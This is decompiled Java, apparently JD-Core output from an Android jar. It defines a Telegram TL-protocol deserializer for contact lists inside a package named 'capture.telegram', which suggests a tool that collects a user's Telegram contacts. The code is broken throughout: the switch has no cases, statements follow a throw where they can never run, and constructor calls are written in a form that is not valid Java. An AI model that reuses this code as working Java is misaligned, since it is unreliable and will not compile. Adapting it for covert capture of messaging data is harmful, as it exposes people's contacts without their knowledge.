package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$contacts_Contacts
  extends TLObject
{
  public ArrayList contacts;
  public ArrayList users;
  
  public TLRPC$contacts_Contacts()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.contacts = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static contacts_Contacts TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in contacts_Contacts", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_contacts_contactsNotModified;
      ((TLRPC.TL_contacts_contactsNotModified)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_contacts_contacts;
      ((TLRPC.TL_contacts_contacts)localObject).<init>();
    }
    if (localObject != null) {
      ((contacts_Contacts)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (contacts_Contacts)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$contacts_Contacts.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */